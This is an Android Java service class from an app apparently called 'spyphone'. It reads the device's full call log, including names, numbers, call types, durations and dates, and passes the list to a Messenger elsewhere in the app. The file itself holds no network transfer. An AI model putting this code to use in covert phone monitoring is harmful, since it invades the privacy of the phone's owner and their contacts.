package emit.esy.es.spyphone.services;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.provider.CallLog;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;

import emit.esy.es.spyphone.interfaces.ServiceResponse;
import emit.esy.es.spyphone.model.CallLogItem;

/**
 * Created by Emil Makovac on 27/04/2015.
 */
public class CallLogService extends IntentService implements ServiceResponse{

    private final static String LOG_TAG = "CallLogService";
    private ArrayList<CallLogItem> clItemList;

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     *
     * @param name Used to name the worker thread, important only for debugging.
     */
    public CallLogService(String name) {
        super(name);
    }

    public CallLogService() {
        super(LOG_TAG);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Log.d(LOG_TAG, "onHandleIntent");
        Cursor callLogCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);

        int number = callLogCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = callLogCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = callLogCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = callLogCursor.getColumnIndex(CallLog.Calls.DURATION);
        int name = callLogCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

        clItemList = new ArrayList<>();

        while (callLogCursor.moveToNext()) {

            String fullName = callLogCursor.getString(name);
            if(fullName == null || fullName.equals(""))
                fullName = "Not in contact";
            String phNum = callLogCursor.getString(number);
            String callTypeCode = callLogCursor.getString(type);
            long lngCallDate = callLogCursor.getLong(date);
            SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yy HH:mm:ss");
            String strDate = sdf.format(new Date(lngCallDate));
            Log.d("date", strDate);
            String callDuration = callLogCursor.getString(duration);
            String callType = null;
            int callCode = Integer.parseInt(callTypeCode);
            switch (callCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callType = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callType = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callType = "Missed";
                    break;
            }

            CallLogItem clItem = new CallLogItem(fullName, phNum, callType, callDuration, strDate);
            clItemList.add(clItem);
        }
        Collections.reverse(clItemList);
        callLogCursor.close();
        onWorkDone(intent);
    }

    @Override
    public void onWorkDone(Intent intent) {
        Log.d(LOG_TAG, "onWorkDone");

        Bundle bundle = intent.getExtras();
        Bundle data = new Bundle();
        data.putString("action", "callLog");
        data.putSerializable("content", clItemList);
        if (bundle != null) {
            Messenger messenger = (Messenger) bundle.get("messenger");
            Message msg = Message.obtain();
            msg.setData(data);//put the data here
            try {
                messenger.send(msg);
            } catch (RemoteException e) {
                Log.i("error", "error");
            }
        }

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(LOG_TAG, "onDestroy");
    }
}
